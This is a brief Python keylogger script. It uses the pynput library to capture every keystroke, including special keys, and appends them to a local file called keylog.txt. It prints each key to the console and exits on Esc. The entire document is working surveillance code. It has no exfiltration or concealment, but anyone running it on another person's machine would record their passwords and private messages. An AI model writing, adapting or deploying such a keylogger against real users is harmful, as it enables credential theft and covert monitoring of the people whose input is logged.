from pynput import keyboard

def keyPressed(key):
    try:
        # Check if the key is a normal character key
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
            print(f"Key pressed: {char}")
            with open("keylog.txt", 'a') as logkey:
                logkey.write(char)
        else:
            print(f"Special key pressed: {key}")
            with open("keylog.txt", 'a') as logkey:
                logkey.write(f"[{key}]")  # Log the special key (e.g., space, enter)
    except Exception as e:
        print(f"Error processing key: {e}")

def on_press(key):
    keyPressed(key)
    
    # Stop listener when the 'esc' key is pressed
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False

if __name__ == "__main__":
    # Start listening to the keyboard
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
